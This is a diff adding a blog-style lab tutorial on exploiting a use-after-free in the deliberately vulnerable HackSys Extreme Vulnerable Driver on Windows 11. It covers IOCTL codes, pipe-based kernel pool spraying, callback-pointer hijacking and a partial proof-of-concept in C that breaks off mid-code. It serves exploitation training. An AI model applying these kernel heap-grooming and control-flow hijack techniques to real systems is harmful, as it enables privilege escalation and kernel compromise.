@@ -1,0 +1,686 @@
+# https://m2rc.net/posts/hevd-useafterfree/
+
+<!DOCTYPE html><html lang="en" dir="auto">
+
+<body class=" dark" id="top">
+
+
+
+<main class="main">
+
+<article class="post-single">
+   <div class="toc">
+    <details>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="https://m2rc.net/posts/hevd-useafterfree/#introduction" aria-label="Introduction">Introduction</a><ul>
+                        
+                <li>
+                    <a href="https://m2rc.net/posts/hevd-useafterfree/#pre-analysis" aria-label="Pre-Analysis">Pre-Analysis</a></li>
+                <li>
+                    <a href="https://m2rc.net/posts/hevd-useafterfree/#setup" aria-label="Setup">Setup</a></li>
+                <li>
+                    <a href="https://m2rc.net/posts/hevd-useafterfree/#analysis" aria-label="Analysis">Analysis</a></li>
+                <li>
+                    <a href="https://m2rc.net/posts/hevd-useafterfree/#windows-kernel-heap-feng-shui" aria-label="Windows Kernel Heap Feng Shui">Windows Kernel Heap Feng Shui</a></li>
+                <li>
+                    <a href="https://m2rc.net/posts/hevd-useafterfree/#interacting-with-the-driver" aria-label="Interacting with the driver">Interacting with the driver</a></li>
+                <li>
+                    <a href="https://m2rc.net/posts/hevd-useafterfree/#exploitation" aria-label="Exploitation">Exploitation</a></li>
+                <li>
+                    <a href="https://m2rc.net/posts/hevd-useafterfree/#resources" aria-label="Resources">Resources</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="f964af93f1fb462aa7a950a1869581af.png" loading="lazy" src="https://m2rc.net/f964af93f1fb462aa7a950a1869581af.png"></p>
+<h1 id="introduction">Introduction<a class="anchor" aria-hidden="true" href="https://m2rc.net/posts/hevd-useafterfree/#introduction">#</a></h1>
+<p>In this blog we will walk through the exploitation of a Use-After-Free vulnerabiliy in a Windows Kernel Driver, we will learn about heap spraying techniques for Windows Kernel Pools, understand how to interact with Kernel Drivers and end up executing shellcode in Ring 0 by taking advantage of this Use-After-Free.</p>
+<p>The exploitation of this bug is not that complex, so it will serve as a great example for learning how to exploit classic UAF vulnerabilities in Kernel Drivers.</p>
+<p>I will be using the 22H2 build from Windows 11 without VBS.</p>
+<h2 id="pre-analysis">Pre-Analysis<a class="anchor" aria-hidden="true" href="https://m2rc.net/posts/hevd-useafterfree/#pre-analysis">#</a></h2>
+<p>In <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.c#L274">HackSysExtremeVulnerableDriver.c#L274</a> is the main IOCTL handler, where the Driver receives IOCTLs from user-mode, and executes different functions based on the IOCTL code provided to it. Think of an IOCTL as a specific system call for a driver to perform an operation.</p>
+<p>It’s quite common for kernel drivers to have a big switch statement to handle incoming IOCTLs.</p>
+<p><img alt="35568dddda005e1f05f0e937b676df96.png" loading="lazy" src="https://m2rc.net/35568dddda005e1f05f0e937b676df96.png"></p>
+<p>There are 4 IOCTLs related to this Use-After-Free vulnerability:</p>
+<ul>
+<li>0x222013 -&gt; <code>AllocateUaFObjectNonPagedPool</code> Allocates an object</li>
+<li>0x222017 -&gt; <code>UseUaFObjectNonPagedPool</code> Calls a function within that object</li>
+<li>0x22201B -&gt; <code>FreeUaFObjectNonPagedPool</code> Frees the object</li>
+<li>0x22201F -&gt; <code>AllocateFakeObjectNonPagedPool</code> Allocates a “fake”, user-provided object</li>
+</ul>
+<p>The <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c">UseAfterFreeNonPagedPool.c</a> file contains all the functions associated with the UAF. Functions ending with <code>IoctlHandler</code> will be the ones executed when their respective IOCTL codes are passed via a <code>DeviceIoControl</code> call to the driver. These helper functions will take care of correctly passing any arguments to the actual functions (if they need any).</p>
+<p>In <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.c#L82">HackSysExtremeVulnerableDriver.c#L82</a> we can see the Device Driver is exposed with the <code>\Device\HackSysExtremeVulnerableDriver</code> name on the Object Manager. This will be important later on when we want to communicate with the driver.</p>
+<h2 id="setup">Setup<a class="anchor" aria-hidden="true" href="https://m2rc.net/posts/hevd-useafterfree/#setup">#</a></h2>
+<p>I won’t walk you through the setup, but ideally you should set up a kernel debugging environment with 2 separate VMs (or a single VM with your host being the debugger), this will help us figure out how and where allocations are happening, as well as debug our exploit.</p>
+<p>VM snapshots will also come in handy when we get to hijacking execution flow in the kernel (we may get some BSODs while troubleshooting our exploit).</p>
+<h2 id="analysis">Analysis<a class="anchor" aria-hidden="true" href="https://m2rc.net/posts/hevd-useafterfree/#analysis">#</a></h2>
+<p><code>AllocateUaFObjectNonPagedPool</code> allocates an object of type <code>USE_AFTER_FREE_NON_PAGED_POOL</code> to a non-paged pool. Think of <code>pools</code> in the context of the Windows Kernel as the kernel’s heap, where one can dynamically allocate memory in Kernel space.</p>
+<p><img alt="f1857acdfa607df76215f4ee98cebbe6.png" loading="lazy" src="https://m2rc.net/f1857acdfa607df76215f4ee98cebbe6.png"></p>
+<p>The <code>USE_AFTER_FREE_NON_PAGED_POOL</code> struct contains a function pointer, and a 0x54 size buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USE_AFTER_FREE_NON_PAGED_POOL
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    FunctionPointer Callback;
+</span></span><span style="display:flex;"><span>    CHAR Buffer[<span style="color:#ae81ff">0x54</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre><button class="copy-code">copy</button></div><p>The pool is allocated using <code>ExAllocatePoolWithTag</code> with the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type">NonPagedPool</a> PoolType parameter, which will make the allocated pool executable. Note this API is actually deprecated, although the only difference with its succesor, <code>ExAllocatePool2</code>, is that the latter will zero-out memory when performing the allocation to help prevent accidental leaks, but it does not make a difference for this specific UAF bug.</p>
+<p>You can pass a <code>tag</code> (identifier) to the ExAllocatePoolWithTag function, which will help locate this pool allocation on a debugger. In this case, the tag is <code>kcaH</code> (Hack), since the pool tags are specified in reverse order.</p>
+<p><img alt="d058267a967557f98db849d0aa4e79f2.png" loading="lazy" src="https://m2rc.net/d058267a967557f98db849d0aa4e79f2.png"></p>
+<p>The Buffer member of the object will be filled with 0x53 ‘A’ characters and 1 null byte to terminate the string. Many debug messages will be logged, which can be received with a tool like <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/debugview">DebugView</a> from Sysinternals or by using WinDBG.</p>
+<p><img alt="bde8949e8e7edefee6c688fd2081194b.png" loading="lazy" src="https://m2rc.net/bde8949e8e7edefee6c688fd2081194b.png"></p>
+<p>Then, the <code>Callback</code> member of the object will be set to the address of the <code>UaFObjectCallbackNonPagedPool</code> function, which only logs a message.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>VOID <span style="color:#a6e22e">UaFObjectCallbackNonPagedPool</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">"[+] UseAfter Free Object Callback NonPagedPool</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre><button class="copy-code">copy</button></div><p>The global variable <code>g_UseAfterFreeObjectNonPagedPool</code> will be assigned the value of the <code>UseAfterFree</code> object. All of these actions will also be printed to DebugView.</p>
+<p><code>UseUaFObjectNonPagedPool</code> will first check if the global variable <code>g_UseAfterFreeObjectNonPagedPool</code> is not 0, check its <code>Callback</code> member, and call that function.</p>
+<p><img alt="60883d9eaca6e684d0676124fbd6d971.png" loading="lazy" src="https://m2rc.net/60883d9eaca6e684d0676124fbd6d971.png"></p>
+<p><code>FreeUaFObjectNonPagedPool</code>, as its name implies, frees the object using ExFreePoolWithTag on the global variable that was assigned the <code>USE_AFTER_FREE_NON_PAGED_POOL</code> object.</p>
+<p><img alt="3ddbebc1e048e9390dbd6c90fc4a41b8.png" loading="lazy" src="https://m2rc.net/3ddbebc1e048e9390dbd6c90fc4a41b8.png"></p>
+<p>Please note, as the comment says, this function is only freeing the object, but never actually zeroing the pointer to the original object, making the <code>g_UseAfterFreeObjectNonPagedPool</code> global variable hold a “dangling pointer” to the (now freed) object. The memory holding the object will be marked as “free”, but there will still be a reference to the object, which introduces Use-After-Free bug.</p>
+<p>The reason why this can be dangerous in our case is due to the object having a callback function that is called in <code>UseUaFObjectNonPagedPool</code>. If we revisit the code, we can see the <code>g_UseAfterFreeObjectNonPagedPool-&gt;Callback()</code> function would be called if its contents were not 0.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (g_UseAfterFreeObjectNonPagedPool) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (g_UseAfterFreeObjectNonPagedPool<span style="color:#f92672">-&gt;</span>Callback) {
+</span></span><span style="display:flex;"><span>	    g_UseAfterFreeObjectNonPagedPool<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Callback</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre><button class="copy-code">copy</button></div><p>Now, since <code>g_UseAfterFreeObjectNonPagedPool</code> points to freed memory, if we could somehow overwrite the object pointed by it with our own, it would be possible to hijack the execution flow of the driver.</p>
+<p>This could be done by doing many allocations of the same size in the non-paged pool until we were lucky enough that our object got allocated in the region of the freed memory.</p>
+<p>Then, if we were to call <code>UseUaFObjectNonPagedPool</code> via its IOCTL, our own Callback function would be executed instead.</p>
+<p>The function <code>AllocateFakeObjectNonPagedPool</code> takes in an argument of type <code>PFAKE_OBJECT_NON_PAGED_POOL</code> that will be allocated into another non-paged pool.</p>
+<p><img alt="d11cf17ca68bd3ef5e65533787b9a615.png" loading="lazy" src="https://m2rc.net/d11cf17ca68bd3ef5e65533787b9a615.png"></p>
+<p>The struct of the fake object looks like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FAKE_OBJECT_NON_PAGED_POOL
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    CHAR Buffer[<span style="color:#ae81ff">0x54</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(PVOID)];
+</span></span><span style="display:flex;"><span>} <span style="color:#f92672">*</span>PFAKE_OBJECT_NON_PAGED_POOL
+</span></span></code></pre><button class="copy-code">copy</button></div><p>We can see the <code>KernelFakeObject</code> holds the address of the newly allocated pool with <code>ExAllocatePoolWithTag</code>.</p>
+<p>Next, <code>ProbeForRead</code> will be called to check if the <code>UserFakeObject</code> actually comes from User-Mode, then, it will copy the memory from User-Land into Kernel-Land and null-terminate the buffer, all while providing debug output via DbgPrint.</p>
+<p><img alt="3edc695a29ab42a9ddfb79b95c7095cf.png" loading="lazy" src="https://m2rc.net/3edc695a29ab42a9ddfb79b95c7095cf.png"></p>
+<p>Let’s now dive into what techniques we could use to allocate our own object within the freed memory.</p>
+<h2 id="windows-kernel-heap-feng-shui">Windows Kernel Heap Feng Shui<a class="anchor" aria-hidden="true" href="https://m2rc.net/posts/hevd-useafterfree/#windows-kernel-heap-feng-shui">#</a></h2>
+<p>Since long ago, there have been multiple heap spraying techniques for the Windows Kernel that allow us to place lots of (almost) arbitrary-sized objects into a non-paged pool. There’s a specific technique that uses <code>pipes</code>, which can be created from User-Mode and works like the following:</p>
+<ol>
+<li>Create a pipe using <code>CreatePipe</code></li>
+<li>Write data to the created pipe, but do not read it</li>
+</ol>
+<p>As long as we don’t read the data back from the pipe, the Windows Kernel will buffer our input buffer in a non-paged pool with the <code>NpFr</code> tag. Let’s see this in action using <a href="https://github.com/zodiacon/PoolMonX">PoolMonX</a>.</p>
+<blockquote>
+<p>This technique was originally documented in <a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/</a>, although originally intended for big pool allocations (&gt;4KB), it works as well for smaller allocations.</p></blockquote>
+<p>First, create a pipe and write 16 bytes to it using WriteFile.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pipeWrite</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE hRead  <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	HANDLE hWrite <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(buff, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(buff));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreatePipe</span>(<span style="color:#f92672">&amp;</span>hRead, <span style="color:#f92672">&amp;</span>hWrite, NULL, <span style="color:#66d9ef">sizeof</span>(buff))) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error creating pipe.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	DWORD bytesWritten <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(hWrite, buff, <span style="color:#66d9ef">sizeof</span>(buff), <span style="color:#f92672">&amp;</span>bytesWritten, NULL)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Unable to write to pipe.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hRead);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hWrite);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[*] Data written to pipe, press enter to continue...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, hRead, hWrite);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CloseHandle</span>(hRead);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CloseHandle</span>(hWrite);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre><button class="copy-code">copy</button></div><p>Before running this function, check the pool with the <code>NpFr</code> tag, as you can see, it currently has 0 bytes allocated.</p>
+<p><img alt="24937d1496335d7eef5fcd9c97cf87e2.png" loading="lazy" src="https://m2rc.net/24937d1496335d7eef5fcd9c97cf87e2.png"></p>
+<p>Now, after writing the data to the pipe, as long as we don’t read it back, a new non-paged pool allocation will be made with the NpFr tag, this one for exactly 80 bytes (0x50 in hex). These non-paged pool allocations will always be 0x10-bytes aligned. Since we wrote 0x10 bytes of data, we can assume there’s probably a 0x40-byte header for the <code>DATA_ENTRY</code> record.</p>
+<p><img alt="d71269c8a6a352b488fe3c3bd89b9702.png" loading="lazy" src="https://m2rc.net/d71269c8a6a352b488fe3c3bd89b9702.png"></p>
+<p>Checking the size of the original object from the struct, we see it’s 96 bytes (0x60 in hex), so, in theory, to write an object of the same size via a pipe, we would have to write anywhere from 0x11 to 0x20 bytes to the pipe for our buffer to have the same size.</p>
+<p>e.g., <code>[0x40 header] + [0x15 input buffer] + [0xB padding] (to be 0x10 byte-aligned) = 0x60</code>.</p>
+<p><img alt="c77ca18fad9f951a25ce4df00c9628ef.png" loading="lazy" src="https://m2rc.net/c77ca18fad9f951a25ce4df00c9628ef.png"></p>
+<p>Let’s check dynamically what the actual size of the real object allocation for the driver is, just to make sure. For quick PoCs like this, I like to use a tool named <a href="http://www.zezula.net/en/tools/filetest.html">FileTest</a>.</p>
+<h2 id="interacting-with-the-driver">Interacting with the driver<a class="anchor" aria-hidden="true" href="https://m2rc.net/posts/hevd-useafterfree/#interacting-with-the-driver">#</a></h2>
+<p>In my case, I had to recompile the driver, as the pre-compiled versions gave me some weird behavior. Once compiled, I loaded the driver by creating a new service and starting it:</p>
+<pre tabindex="0"><code>sc.exe create HEVD binPath= C:\uaf\HEVD.sys type= kernel start= demand
+sc.exe start HEVD
+</code><button class="copy-code">copy</button></pre><p>Now, in FileTest, use CreateFile on <code>\\.\HacksysExtremeVulnerableDriver</code> to open a handle to the driver.</p>
+<p><img alt="e977c7f03d5df048f33d44a9fc9fa7b3.png" loading="lazy" src="https://m2rc.net/e977c7f03d5df048f33d44a9fc9fa7b3.png"></p>
+<p>This handle will now be used by FileTest to perform any further operations on the driver, like calling IOCTLs. Now, on DebugView, make sure <code>Capture Kernel</code> and <code>Enable Verbose Kernel Output</code> are checked in <code>Capture</code>. Once this is done, go to IOCTL on FileTest, and call DeviceIoControl with the <code>0x222013</code> IOCTL (AllocateUaFObjectNonPagedPool) to allocate the object.</p>
+<p><img alt="09230e999106c9cdc07443e9da3c77ca.png" loading="lazy" src="https://m2rc.net/09230e999106c9cdc07443e9da3c77ca.png"></p>
+<p>Actually, we see something different than we initially thought, the actual allocation size of the non-paged pool with the “Hack” tag is 112 bytes (0x70), so there probably is some extra data (like a header), making the actual size bigger than we thought. From the debug output, we get much information about the allocated object and the pool, which will come in handy later. Note that even if the debug messages say the pool size is “0x60”, we just saw in PoolMonX it’s actually 0x70, so, to make a non-paged pool allocation of the same size, we’ll have to write between 0x21 and 0x30 bytes of data to the pipe.</p>
+<p>We can also check the pool’s size on the debugger using the <code>!pool [address]</code> command. If we access that memory address, we see the pool starts at <code>0xffffd28934ce6040</code>, although the actual object is allocated on <code>0xffffd28934ce6040+0x10</code>, after the pool header (<code>_POOL_HEADER</code>).</p>
+<p><img alt="621b2af5d37c768b012dcf60c3e77502.png" loading="lazy" src="https://m2rc.net/621b2af5d37c768b012dcf60c3e77502.png"></p>
+<p>On purple, there’s the <code>_POOL_HEADER</code> (0x10 bytes), after it, the “Callback” function pointer from the allocated object (8 bytes), followed by the 0x54 buffer (0x53 A’s + 1 null-byte to terminate the string), and finally, 4 bytes of padding at the end to align the pool to 0x10 bytes.</p>
+<p>Now, let’s try to allocate the user-provided object and see what it looks like in memory. We’ll use FileTest once again to call the 0x22201F IOCTL (AllocateFakeObjectNonPagedPool), passing a buffer of 0x54 in size, just like in the original object. Since this fake object allocation will also have the “Hack” tag, I decided to reboot the VM (I couldn’t restart the driver for some reason) to see the results from PoolMonX more clearly.</p>
+<p><img alt="25b0c42f98fb2820f42c6a73993bb5ce.png" loading="lazy" src="https://m2rc.net/25b0c42f98fb2820f42c6a73993bb5ce.png"></p>
+<p>We passed a buffer of 84 bytes (0x54), from the debug output we see the “pool size” is said to be 0x5C, although checking in the debugger, we see it’s actually 0x70, as well as the real object. Again, the pool starts at <code>0xffffb98dab46b040</code>, but the actual object we provided is at <code>0xffffb98dab46b040+0x10</code>, containing our input buffer of 0x54 bytes (0x53 B’s + 1 null-byte) and 12 bytes of padding.</p>
+<p><img alt="759aecc1df94675b30e4e07073dcfde1.png" loading="lazy" src="https://m2rc.net/759aecc1df94675b30e4e07073dcfde1.png"></p>
+<p>Knowing how the objects look in memory, we can now work on the exploitation of the UAF bug by using the heap spraying technique with pipes and allocating many fake objects until one lands on the freed memory.</p>
+<h2 id="exploitation">Exploitation<a class="anchor" aria-hidden="true" href="https://m2rc.net/posts/hevd-useafterfree/#exploitation">#</a></h2>
+<p>Now, onto the exploitation part. As mentioned before, we’ll be using a heap spraying technique involving pipes. But how does this technique work, and what does it accomplish?</p>
+<p>This technique will allow us to put the heap into our desired state by making many allocations of 0x70 bytes from different non-paged pools, all by writing data to pipes and freeing the allocations sequentially, this way, we can create “holes” in between the allocations. Then, once we tell the driver to allocate the real object, there is a very high chance the object will land in one of the “holes” we created.</p>
+<p>After the real object is freed, we will allocate many fake objects on the non-paged pool, with a high probability of overwriting the real object with our own. Since the original object held a function pointer, if we end up overwriting this pointer, we can gain control of the execution flow in Ring 0.</p>
+<p>There are multiple steps that would have to be made in order for this to work, the first one being a “defragmentation” heap spray. Heap allocations are happening constantly on the kernel for different sizes, this makes the state of the heap unpredictable, so, in order to “normalize” this state, we can first perform a high number of 0x70 allocations. This is done so that the pool allocator will eventually look for other large sections of memory to fill those new allocations.</p>
+<p>Once we’re finished with the initial defragmentation spray, we can perform another high number of 0x70-sized allocations, we will call this the sequential spray.</p>
+<p>Now, there should be a large section of kernel memory with many non-paged pool allocations that look something like this:</p>
+<pre tabindex="0"><code>                                                                                       
+    ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐    
+... │  0x70 pool  │ │  0x70 pool  │ │  0x70 pool  │ │  0x70 pool  │ │  0x70 pool  │ ...
+    └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘    
+</code><button class="copy-code">copy</button></pre><p>After this, the idea would be to destroy every other allocation of the sequential spray by closing their respective pipe handles, essentially creating “holes” in the sequential allocation. Now, the section should look something like this:</p>
+<pre tabindex="0"><code>                                                                                       
+    ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐    
+... │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ ...
+    └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘    
+                                                                                       
+</code><button class="copy-code">copy</button></pre><p>Next, after calling <code>AllocateUaFObjectNonPagedPool</code>, the real object will likely be allocated in one of the “holes” we made. Now, <code>g_UseAfterFreeObjectNonPagedPool</code> will hold a pointer to the real object.</p>
+<pre tabindex="0"><code>    ┌─────────────┐ ┌───────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐    
+... │  0x70 pool  │ │  0x70 object  │ │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ ...
+    └─────────────┘ └───────────────┘ └─────────────┘ └─────────────┘ └─────────────┘    
+                            ▲                                                            
+                            │                                                            
+                            │                                                            
+                            │                                                            
+                            └────── g_UseAfterFreeObjectNonPagedPool                     
+</code><button class="copy-code">copy</button></pre><p>Then, after we call <code>FreeUaFObjectNonPagedPool</code>, the real object’s pool memory region will be marked as free, but the <code>g_UseAfterFreeObjectNonPagedPool</code> will still hold a reference to the original object (dangling pointer), since its pointer was never zeroed out.</p>
+<pre tabindex="0"><code>                       free memory                                                       
+    ┌─────────────┐ ┌───────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐    
+... │  0x70 pool  │ │  0x70 object  │ │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ ...
+    └─────────────┘ └───────────────┘ └─────────────┘ └─────────────┘ └─────────────┘    
+                            ▲                                                            
+                            │                                                            
+                            │              (dangling pointer)                            
+                            │                                                            
+                            └────── g_UseAfterFreeObjectNonPagedPool                     
+</code><button class="copy-code">copy</button></pre><p>Now it’s time for the overwrite. Since the original object’s pool was marked as free, the pool allocator can now use that 0x70 space in memory. If we overwrite this region with our fake object, <code>g_UseAfterFreeObjectNonPagedPool</code> will be pointing to our fake object instead, and we could make the driver call our own function pointer by using the 0x222017 IOCTL (<code>UseUaFObjectNonPagedPool</code>).</p>
+<p>We will achieve this overwrite by repeatedly calling <code>AllocateFakeObjectNonPagedPool</code> many times to make sure our fake object actually lands on the freed memory pointed to by <code>g_UseAfterFreeObjectNonPagedPool</code>.</p>
+<pre tabindex="0"><code>              fakeObject-&gt;Callback = 0xDEADBEEF133F133F                                      
+                                                                                             
+    ┌─────────────┐ ┌───────────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐    
+... │  0x70 pool  │ │  0x70 fakeObject  │ │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ ...
+    └─────────────┘ └───────────────────┘ └─────────────┘ └─────────────┘ └─────────────┘    
+                              ▲                                                              
+                              │                                                              
+                              │                                                              
+                              │                                                              
+                              └──── g_UseAfterFreeObjectNonPagedPool                         
+</code><button class="copy-code">copy</button></pre><p>Finally, we can trigger the UAF by calling <code>UseUaFObjectNonPagedPool</code> via its IOCTL, which will end up executing the code at our function pointer.</p>
+<p>This is the PoC of everything we have so far:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FAKE_OBJECT_NON_PAGED_POOL {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	CHAR Buffer[<span style="color:#ae81ff">0x54</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(PVOID)];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>} FAKE_OBJECT_NON_PAGED_POOL, <span style="color:#f92672">*</span> PFAKE_OBJECT_NON_PAGED_POOL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _rwPipe {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE hRead;
+</span></span><span style="display:flex;"><span>	HANDLE hWrite;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>} rwPipe, <span style="color:#f92672">*</span> p_rwPipe;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HANDLE hDevice <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rwPipe <span style="color:#a6e22e">objSpray</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE hRead <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	HANDLE hWrite <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">0x30</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(buff, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(buff));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreatePipe</span>(<span style="color:#f92672">&amp;</span>hRead, <span style="color:#f92672">&amp;</span>hWrite, NULL, <span style="color:#66d9ef">sizeof</span>(buff))) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error creating pipe, exiting...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
